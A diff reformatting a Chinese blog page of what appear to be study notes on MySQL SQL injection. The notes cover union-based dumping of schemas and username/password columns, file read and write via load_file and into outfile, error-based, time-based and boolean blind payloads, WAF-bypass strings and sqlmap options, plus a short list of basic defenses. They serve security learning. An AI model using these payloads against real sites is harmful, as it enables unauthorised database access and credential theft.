@@ -21,12 +21,12 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"tianlipa.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.24.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":16,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeIn","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
 
-    <meta name="description" content="第一章MySQL语法union查询需要前后语句查询字段数量相同 order by字段名&#x2F;数字 MySQL系统库information_schema库：信息数据库，保存关于MySQL服务器维护的所有其他水库的信息  SCHEMATA表：提供当前MySQL实例中所有数据库信息 TABLES表：提供关于数据中表的信息，table_name COLOMNS表：提供表的列信息，column_nam">
+    <meta name="description" content="第一章 MySQL语法 union查询需要前后语句查询字段数量相同 order by字段名&#x2F;数字 MySQL系统库 information_schema库：信息数据库，保存关于MySQL服务器维护的所有其他水库的信息  SCHEMATA表：提供当前MySQL实例中所有数据库信息 TABLES表：提供关于数据中表的信息，table_name COLOMNS表：提供表的列信息，column_name">
 <meta property="og:type" content="article">
 <meta property="og:title" content="2-SQL注入">
 <meta property="og:url" content="https://tianlipa.github.io/2025/08/msb-02-sql-injection/index.html">
 <meta property="og:site_name" content="tianlipa">
-<meta property="og:description" content="第一章MySQL语法union查询需要前后语句查询字段数量相同 order by字段名&#x2F;数字 MySQL系统库information_schema库：信息数据库，保存关于MySQL服务器维护的所有其他水库的信息  SCHEMATA表：提供当前MySQL实例中所有数据库信息 TABLES表：提供关于数据中表的信息，table_name COLOMNS表：提供表的列信息，column_nam">
+<meta property="og:description" content="第一章 MySQL语法 union查询需要前后语句查询字段数量相同 order by字段名&#x2F;数字 MySQL系统库 information_schema库：信息数据库，保存关于MySQL服务器维护的所有其他水库的信息  SCHEMATA表：提供当前MySQL实例中所有数据库信息 TABLES表：提供关于数据中表的信息，table_name COLOMNS表：提供表的列信息，column_name">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://tianlipa.github.io/img/msb/17372058872557.png">
 <meta property="og:image" content="https://tianlipa.github.io/img/msb/17374514447604.png">
@@ -349,9 +349,12 @@
     
     
     
-    <div class="post-body" itemprop="articleBody"><h2 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h2><h3 id="MySQL语法"><a href="#MySQL语法" class="headerlink" title="MySQL语法"></a>MySQL语法</h3><p>union查询需要前后语句查询字段数量相同</p>
-<p>order by字段名&#x2F;数字</p>
-<h3 id="MySQL系统库"><a href="#MySQL系统库" class="headerlink" title="MySQL系统库"></a>MySQL系统库</h3><p>information_schema库：信息数据库，保存关于MySQL服务器维护的所有其他水库的信息</p>
+    <div class="post-body" itemprop="articleBody"><h2 id="第一章">第一章</h2>
+<h3 id="MySQL语法">MySQL语法</h3>
+<p>union查询需要前后语句查询字段数量相同</p>
+<p>order by字段名/数字</p>
+<h3 id="MySQL系统库">MySQL系统库</h3>
+<p>information_schema库：信息数据库，保存关于MySQL服务器维护的所有其他水库的信息</p>
 <ul>
 <li>SCHEMATA表：提供当前MySQL实例中所有数据库信息</li>
 <li>TABLES表：提供关于数据中表的信息，table_name</li>
@@ -361,102 +364,169 @@
 <p>mysql库：核心数据库，存储数据库的用户（账户）信息</p>
 <p>sys库：系统数据库，结合了information_schema和performance_schema库的内容</p>
 <span id="more"></span>
-
-<h2 id="第二章-MySQL手工注入"><a href="#第二章-MySQL手工注入" class="headerlink" title="第二章 MySQL手工注入"></a>第二章 MySQL手工注入</h2><ol>
-<li>检查输入过滤，判断有无注入点(and 1&#x3D;1)</li>
+<h2 id="第二章-MySQL手工注入">第二章 MySQL手工注入</h2>
+<ol>
+<li>检查输入过滤，判断有无注入点(and 1=1)</li>
 <li>猜解列名数量：order by</li>
 <li>通过报错方式判断回显点：union</li>
-<li>信息收集：<br> version()数据库版本，database()数据库名称<br> 高版本：5.0+，系统库：information_schema, performance_schema, …<br> 低版本：5.0以下，没有系统库</li>
-<li>使用对应SQL进行注入<br> information_schema.tables查找表名<br> 查询所有数据库名：<br> <code>union select 1,group_concat(schema_name),3 from information_schema.schemata</code><br> 查询security库下所有表名：<br> <code>union select 1,table_name,3 from informaion_schema.tables where table_schema = ‘security’</code><br> ‘security’可替换为database()<br> <code>group_concat(table_name)</code>数据合并分组<br> 查询表中字段：<br> <code>union select 1,group_concat(column_name),3 from information_schema.columns where table_name=‘users’</code><br> 字符可以转换成十六进制<br> 找到字段名后：<br> <code>select username,password from users</code><br> <code>select group_concat(username,0x3a,password) from users</code></li>
+<li>信息收集：<br>
+version()数据库版本，database()数据库名称<br>
+高版本：5.0+，系统库：information_schema, performance_schema, …<br>
+低版本：5.0以下，没有系统库</li>
+<li>使用对应SQL进行注入<br>
+information_schema.tables查找表名<br>
+查询所有数据库名：<br>
+<code>union select 1,group_concat(schema_name),3 from information_schema.schemata</code><br>
+查询security库下所有表名：<br>
+<code>union select 1,table_name,3 from informaion_schema.tables where table_schema = ‘security’</code><br>
+‘security’可替换为database()<br>
+<code>group_concat(table_name)</code>数据合并分组<br>
+查询表中字段：<br>
+<code>union select 1,group_concat(column_name),3 from information_schema.columns where table_name=‘users’</code><br>
+字符可以转换成十六进制<br>
+找到字段名后：<br>
+<code>select username,password from users</code><br>
+<code>select group_concat(username,0x3a,password) from users</code></li>
 </ol>
-<h3 id="高权限注入"><a href="#高权限注入" class="headerlink" title="高权限注入"></a>高权限注入</h3><p>多个网站共享MySQL服务器时，可以从高权限数据库注入到低权限数据库。</p>
+<h3 id="高权限注入">高权限注入</h3>
+<p>多个网站共享MySQL服务器时，可以从高权限数据库注入到低权限数据库。</p>
 <p>user()查看用户</p>
 <p>mysql库中存在4个控制权限的表，user(最高权限), db(对数据库的权限), tables_priv(对表名的操作权限), columns_priv(对字段的操作权限)。</p>
 <blockquote>
-<p>mysql权限表的验证过程为：<br>先从user表中的Host,User,Password这3个字段中判断连接的ip、用户名、密码是否存在，存在则通过验证。</p>
+<p>mysql权限表的验证过程为：<br>
+先从user表中的Host,User,Password这3个字段中判断连接的ip、用户名、密码是否存在，存在则通过验证。</p>
 </blockquote>
 <blockquote>
 <p>通过身份认证后，进行权限分配，按照user，db，tables_priv，columns_priv的顺序进行验证。即先检查全局权限表user，如果user中对应的权限为Y，则此用户对所有数据库的权限都为Y，将不再检查db, tables_priv,columns_priv；如果为N，则到db表中检查此用户对应的具体数据库，并得到db中为Y的权限；如果db中为N，则检查tables_priv中此数据库对应的具体表，取得表中的权限Y，以此类推。</p>
 </blockquote>
 <blockquote>
-<p>MySQL 权限级别分为：<br>全局性的管理权限： 作用于整个MySQL实例级别<br>数据库级别的权限： 作用于某个指定的数据库上或者所有的数据库上<br>数据库对象级别的权限：作用于指定的数据库对象上（表、视图等）或者所有的数据库对象上</p>
+<p>MySQL 权限级别分为：<br>
+全局性的管理权限： 作用于整个MySQL实例级别<br>
+数据库级别的权限： 作用于某个指定的数据库上或者所有的数据库上<br>
+数据库对象级别的权限：作用于指定的数据库对象上（表、视图等）或者所有的数据库对象上</p>
 </blockquote>
 <blockquote>
 <p>权限存储在mysql库的user, db, tables_priv, columns_priv, and procs_priv这几个系统表中，待MySQL实例启动后就加载到内存中</p>
 </blockquote>
-<p><img src="/img/msb/17372058872557.png"></p>
-<h3 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h3><p>前提条件：高权限</p>
+<p><img src="/img/msb/17372058872557.png" alt=""></p>
+<h3 id="文件读写">文件读写</h3>
+<p>前提条件：高权限</p>
 <p>高版本MySQL添加了一个新的特性secure_file.priv, 限制了MySQL导出文件的权限。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Linux</span><br><span class="line">cat /etc/my.cnf</span><br><span class="line">    [mysqld]</span><br><span class="line">    secure_file.priv=</span><br><span class="line"></span><br><span class="line"># Windows</span><br><span class="line">my.ini</span><br><span class="line">    [mysqld]</span><br><span class="line">    secure_file.priv=</span><br></pre></td></tr></table></figure>
-<p>空：没有限制，NULL：不能进行读写，&#x3D;d:&#x2F;xxx&#x2F;xxx：只能读写该目录下文件。</p>
+<p>空：没有限制，NULL：不能进行读写，=d:/xxx/xxx：只能读写该目录下文件。</p>
 <p><code>show global variables like ‘%secure%’</code>查看MySQL全局变量的配置。</p>
-<p>读文件函数<code>load_file()</code>，参数可以说单引号字符串，0x，char转换的字符，注意斜杠是&#x2F;。<br>可以在union中作为一个字段使用，查看config.php, apache配置等。<br>可以使用相对路径。</p>
-<p>Windows常见路径：<br>phpstudy:   phpstudy&#x2F;www, phpstudy&#x2F;PHPTutorial&#x2F;www<br>Xampp:  xampp&#x2F;htdocs<br>Wamp:   wamp&#x2F;www<br>Appser: appser&#x2F;www</p>
-<p>Linux常见路径：<br>&#x2F;var&#x2F;mysql&#x2F;data<br>&#x2F;var&#x2F;www&#x2F;html</p>
+<p>读文件函数<code>load_file()</code>，参数可以说单引号字符串，0x，char转换的字符，注意斜杠是/。<br>
+可以在union中作为一个字段使用，查看config.php, apache配置等。<br>
+可以使用相对路径。</p>
+<p>Windows常见路径：<br>
+phpstudy:   phpstudy/www, phpstudy/PHPTutorial/www<br>
+Xampp:  xampp/htdocs<br>
+Wamp:   wamp/www<br>
+Appser: appser/www</p>
+<p>Linux常见路径：<br>
+/var/mysql/data<br>
+/var/www/html</p>
 <p>获取路径常见方式：报错显示，遗留文件，漏洞报错，平台配置文件等。</p>
-<p>写入文件：函数<code>Into Outfile</code>（能写入多行，按格式输出），<code>into Dumpfile</code>（只能写入一行，没有输出格式）。<br>outfile不能接0x或char，只能是单引号路径。</p>
+<p>写入文件：函数<code>Into Outfile</code>（能写入多行，按格式输出），<code>into Dumpfile</code>（只能写入一行，没有输出格式）。<br>
+outfile不能接0x或char，只能是单引号路径。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,’abc’,3 into outfile ‘d:/1.txt —-+’</span><br></pre></td></tr></table></figure>
-
-<h3 id="基础防御"><a href="#基础防御" class="headerlink" title="基础防御"></a>基础防御</h3><h4 id="魔术引号"><a href="#魔术引号" class="headerlink" title="魔术引号"></a>魔术引号</h4><p>php.ini中magic_quotes_gpc &#x3D; On&#x2F;Off<br>(GET&#x2F;POST&#x2F;Cookie)</p>
-<h3 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h3><p>is_int()<br>addslashes()<br>mysql_real_escape_string()<br>mysql_escape_string()</p>
-<h3 id="自定义关键字过滤"><a href="#自定义关键字过滤" class="headerlink" title="自定义关键字过滤"></a>自定义关键字过滤</h3><p>str_replace()</p>
-<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>其他安全防护软件如WAF等</p>
-<h2 id="第三章-数据类型与提交方式"><a href="#第三章-数据类型与提交方式" class="headerlink" title="第三章 数据类型与提交方式"></a>第三章 数据类型与提交方式</h2><p>类型转换：’1abc’和1</p>
-<h3 id="模糊查询"><a href="#模糊查询" class="headerlink" title="模糊查询"></a>模糊查询</h3><p><code>select * from users where username like ‘%D%’</code></p>
-<h3 id="数据提交方式"><a href="#数据提交方式" class="headerlink" title="数据提交方式"></a>数据提交方式</h3><h4 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h4><p>url中传输数据，可利用联合注入方式直接注入。<br>一般用于数据不敏感时，安全性不高，长度有限制，速度很快</p>
-<h4 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h4><p>直接传递给服务器。<br>一般用于表单的提交，如登录框。安全性高，长度不限，速度不快。</p>
-<h4 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h4><p><code>$c = $_COOKIE[‘s’];</code><br>可以绕过一些常规防御手段</p>
-<h4 id="Request"><a href="#Request" class="headerlink" title="Request"></a>Request</h4><p>可获取GET&#x2F;POST参数。<br><code>$uname = $_REQUEST[‘uname’];</code></p>
+<h3 id="基础防御">基础防御</h3>
+<h4 id="魔术引号">魔术引号</h4>
+<p>php.ini中magic_quotes_gpc = On/Off<br>
+(GET/POST/Cookie)</p>
+<h3 id="内置函数">内置函数</h3>
+<p>is_int()<br>
+addslashes()<br>
+mysql_real_escape_string()<br>
+mysql_escape_string()</p>
+<h3 id="自定义关键字过滤">自定义关键字过滤</h3>
+<p>str_replace()</p>
+<h3 id="其他">其他</h3>
+<p>其他安全防护软件如WAF等</p>
+<h2 id="第三章-数据类型与提交方式">第三章 数据类型与提交方式</h2>
+<p>类型转换：’1abc’和1</p>
+<h3 id="模糊查询">模糊查询</h3>
+<p><code>select * from users where username like ‘%D%’</code></p>
+<h3 id="数据提交方式">数据提交方式</h3>
+<h4 id="GET">GET</h4>
+<p>url中传输数据，可利用联合注入方式直接注入。<br>
+一般用于数据不敏感时，安全性不高，长度有限制，速度很快</p>
+<h4 id="POST">POST</h4>
+<p>直接传递给服务器。<br>
+一般用于表单的提交，如登录框。安全性高，长度不限，速度不快。</p>
+<h4 id="Cookie">Cookie</h4>
+<p><code>$c = $_COOKIE[‘s’];</code><br>
+可以绕过一些常规防御手段</p>
+<h4 id="Request">Request</h4>
+<p>可获取GET/POST参数。<br>
+<code>$uname = $_REQUEST[‘uname’];</code></p>
 <p>类似的超全局变量还有_SERVER。</p>
-<h2 id="第四章-查询方式和报错注入"><a href="#第四章-查询方式和报错注入" class="headerlink" title="第四章 查询方式和报错注入"></a>第四章 查询方式和报错注入</h2><h3 id="查询方式"><a href="#查询方式" class="headerlink" title="查询方式"></a>查询方式</h3><h4 id="select查询数据"><a href="#select查询数据" class="headerlink" title="select查询数据"></a>select查询数据</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from where id=$id</span><br></pre></td></tr></table></figure>
-
-<h4 id="delete删除数据"><a href="#delete删除数据" class="headerlink" title="delete删除数据"></a>delete删除数据</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">delete from user where id=$id</span><br></pre></td></tr></table></figure>
-
-<h4 id="insert插入数据"><a href="#insert插入数据" class="headerlink" title="insert插入数据"></a>insert插入数据</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into user (id,name,pass) values(1,’lihua’,’1234’)</span><br></pre></td></tr></table></figure>
-
-<h4 id="update更新数据"><a href="#update更新数据" class="headerlink" title="update更新数据"></a>update更新数据</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update user set pwd=‘123’ where id=1</span><br></pre></td></tr></table></figure>
-
-<h3 id="报错盲注"><a href="#报错盲注" class="headerlink" title="报错盲注"></a>报错盲注</h3><h4 id="基于报错的SQL盲注-报错回显（强制性报错）"><a href="#基于报错的SQL盲注-报错回显（强制性报错）" class="headerlink" title="基于报错的SQL盲注 - 报错回显（强制性报错）"></a>基于报错的SQL盲注 - 报错回显（强制性报错）</h4><p>updatexml(): 从目标XML中更改包含所查询值的字符串<br>updatexml(XML_document, XPath_string, new_value);</p>
-<p>extractvalue(): 从目标XML中返回包含所查询值的字符串<br>extractvalue(XML_document, Xpath_string);</p>
+<h2 id="第四章-查询方式和报错注入">第四章 查询方式和报错注入</h2>
+<h3 id="查询方式">查询方式</h3>
+<h4 id="select查询数据">select查询数据</h4>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from where id=$id</span><br></pre></td></tr></table></figure>
+<h4 id="delete删除数据">delete删除数据</h4>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">delete from user where id=$id</span><br></pre></td></tr></table></figure>
+<h4 id="insert插入数据">insert插入数据</h4>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into user (id,name,pass) values(1,’lihua’,’1234’)</span><br></pre></td></tr></table></figure>
+<h4 id="update更新数据">update更新数据</h4>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update user set pwd=‘123’ where id=1</span><br></pre></td></tr></table></figure>
+<h3 id="报错盲注">报错盲注</h3>
+<h4 id="基于报错的SQL盲注-报错回显（强制性报错）">基于报错的SQL盲注 - 报错回显（强制性报错）</h4>
+<p>updatexml(): 从目标XML中更改包含所查询值的字符串<br>
+updatexml(XML_document, XPath_string, new_value);</p>
+<p>extractvalue(): 从目标XML中返回包含所查询值的字符串<br>
+extractvalue(XML_document, Xpath_string);</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abc’ union select 1,extractvalue(1, concat(0x7e, (select version()), 0x7e))#</span><br></pre></td></tr></table></figure>
-
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abc&#x27; union select 1,extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database()limit 0,1),0x7e))#</span><br></pre></td></tr></table></figure>
-
 <p>注：limit 0,1: 从0开始取1个</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abc&#x27; union select 1,updatexml(1,concat(0x7e,(select version()),0x7e),123)#</span><br></pre></td></tr></table></figure>
-
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abc&#x27; or updatexml(1,concat(0x7e,(select version()),0x7e),123)#</span><br></pre></td></tr></table></figure>
-
-
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abc&#x27; or updatexml(1,concat(0x7e,(select version()),0x7e),123) or’</span><br></pre></td></tr></table></figure>
-
-<h3 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select if(database()=‘test’,123,456);</span><br></pre></td></tr></table></figure>
-
+<h3 id="延时盲注">延时盲注</h3>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select if(database()=‘test’,123,456);</span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 and sleep(if(length(database()=8),5,0));</span><br></pre></td></tr></table></figure>
-
-<p>sleep():    休眠<br>if():   分支结构<br>mid(a,b,c): 从b开始，截取a字符串的c位<br>substr(a,b,c):  从b开始，截取a字符串的c个字符<br>left(a,b):  从左侧截取a的前b位<br>length():   长度<br>ord&#x3D;ascii ascii(x)&#x3D;100: 判断x的ascii值是否为100</p>
+<p>sleep():    休眠<br>
+if():   分支结构<br>
+mid(a,b,c): 从b开始，截取a字符串的c位<br>
+substr(a,b,c):  从b开始，截取a字符串的c个字符<br>
+left(a,b):  从左侧截取a的前b位<br>
+length():   长度<br>
+ord=ascii ascii(x)=100: 判断x的ascii值是否为100</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sleep(if(mid(database(),1,1)=116,5,0);</span><br></pre></td></tr></table></figure>
-
-<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>仅返回True或False时据此得到数据库中的信息。</p>
+<h3 id="布尔盲注">布尔盲注</h3>
+<p>仅返回True或False时据此得到数据库中的信息。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1’ and ascii(mid(database(),1,1))&gt;115</span><br></pre></td></tr></table></figure>
-
-<h3 id="加解密注入"><a href="#加解密注入" class="headerlink" title="加解密注入"></a>加解密注入</h3><p>根据传输方式进行对应的加解密。</p>
-<h3 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h3><p>已知数据库，但不知道列名(information_schema被禁用)时，可以进行无列名注入。</p>
+<h3 id="加解密注入">加解密注入</h3>
+<p>根据传输方式进行对应的加解密。</p>
+<h3 id="无列名注入">无列名注入</h3>
+<p>已知数据库，但不知道列名(information_schema被禁用)时，可以进行无列名注入。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select `3` from (select 1,2,3 union select * from users)a;</span><br><span class="line"></span><br><span class="line"># 正常情况下反引号会被过滤</span><br><span class="line">select b from (select 1,2 as b,3 union select * from users)a; # 查询第二列</span><br><span class="line"></span><br><span class="line">select concat(`2`,0x2d,`3`) from (select 1,2,3 union select * from users)a limit 1,3    #同时查询多个列</span><br></pre></td></tr></table></figure>
-
-<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>利用注入点执行下一条SQL语句，与union联合注入的区别在于可以用于执行任意语句。</p>
-<h2 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h2><p>WAF拦截原理：从规则库中匹配敏感字符进行拦截。<br>例：网站安全狗，宝塔，阿里云云盾</p>
-<h3 id="更改数据提交方式"><a href="#更改数据提交方式" class="headerlink" title="更改数据提交方式"></a>更改数据提交方式</h3><p>没啥用</p>
-<h3 id="数据本身"><a href="#数据本身" class="headerlink" title="数据本身"></a>数据本身</h3><p>更换大小写（没啥用）<br>内联注释：data&#x2F;**&#x2F;base()<br>双写绕过：ununionion<br><code>/*!union select * from users*/</code>感叹号后面的内容会执行</p>
-<p>同义词替换：<br>and &amp;&amp;<br>or  ||<br>&#x3D; &lt;、&gt;<br>空格  %09, %0a, %0b, %0c, %0d, %20, %a0, (), &#x2F;**&#x2F;<br>注：%0a是换行，也可以指代空格</p>
+<h3 id="堆叠注入">堆叠注入</h3>
+<p>利用注入点执行下一条SQL语句，与union联合注入的区别在于可以用于执行任意语句。</p>
+<h2 id="WAF绕过">WAF绕过</h2>
+<p>WAF拦截原理：从规则库中匹配敏感字符进行拦截。<br>
+例：网站安全狗，宝塔，阿里云云盾</p>
+<h3 id="更改数据提交方式">更改数据提交方式</h3>
+<p>没啥用</p>
+<h3 id="数据本身">数据本身</h3>
+<p>更换大小写（没啥用）<br>
+内联注释：data/**/base()<br>
+双写绕过：ununionion<br>
+<code>/*!union select * from users*/</code>感叹号后面的内容会执行</p>
+<p>同义词替换：<br>
+and &amp;&amp;<br>
+or  ||<br>
+= &lt;、&gt;<br>
+空格  %09, %0a, %0b, %0c, %0d, %20, %a0, (), /**/<br>
+注：%0a是换行，也可以指代空格</p>
 <p>换行(\N)绕过</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union #/*%0a select/*!1,2,3*/ —-+</span><br><span class="line">union/*//—-/*/ /*!—-+/*%0aselect/*11,database(),3*/ —+</span><br></pre></td></tr></table></figure>
-
 <p>HTTP参污染：如果WAF没有对多参数进行多次过滤，则只会识别其中一个</p>
-<p><img src="/img/msb/17374514447604.png"></p>
+<p><img src="/img/msb/17374514447604.png" alt=""></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&amp;id=-1%20union%20select%201,2,3%23*/</span><br></pre></td></tr></table></figure>
-
-<h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><ul>
+<h2 id="sqlmap">sqlmap</h2>
+<ul>
 <li>基于布尔类型的盲注</li>
 <li>基于时间的盲注</li>
 <li>基于报错注入</li>
@@ -464,12 +534,24 @@
 <li>堆查询注入</li>
 <li>带外注入</li>
 </ul>
-<h3 id="GET型注入"><a href="#GET型注入" class="headerlink" title="GET型注入"></a>GET型注入</h3><p>-u  GET提交方式，跟注入的url网址</p>
-<p>—-dbs   获取所有数据库<br>—-tables    获取所有数据表<br>—-columns   获取所有字段<br>—-dump  打印数据</p>
-<p>-D  查询某个库<br>-T  查询某个表<br>-C  查询某个字段</p>
-<p>—-level 高时测试范围更大<br>—-risk</p>
-<h3 id="POST型注入"><a href="#POST型注入" class="headerlink" title="POST型注入"></a>POST型注入</h3><p>-r  加载文件<br>-p  指定参数<br>—-current-db    当前数据库<br>—-forms 自动检测表单</p>
-<h3 id="UA注入和Refer注入"><a href="#UA注入和Refer注入" class="headerlink" title="UA注入和Refer注入"></a>UA注入和Refer注入</h3><p>注意，存在POST请求时才会出现referer。</p>
+<h3 id="GET型注入">GET型注入</h3>
+<p>-u  GET提交方式，跟注入的url网址</p>
+<p>—-dbs   获取所有数据库<br>
+—-tables    获取所有数据表<br>
+—-columns   获取所有字段<br>
+—-dump  打印数据</p>
+<p>-D  查询某个库<br>
+-T  查询某个表<br>
+-C  查询某个字段</p>
+<p>—-level 高时测试范围更大<br>
+—-risk</p>
+<h3 id="POST型注入">POST型注入</h3>
+<p>-r  加载文件<br>
+-p  指定参数<br>
+—-current-db    当前数据库<br>
+—-forms 自动检测表单</p>
+<h3 id="UA注入和Refer注入">UA注入和Refer注入</h3>
+<p>注意，存在POST请求时才会出现referer。</p>
 
     </div>
 
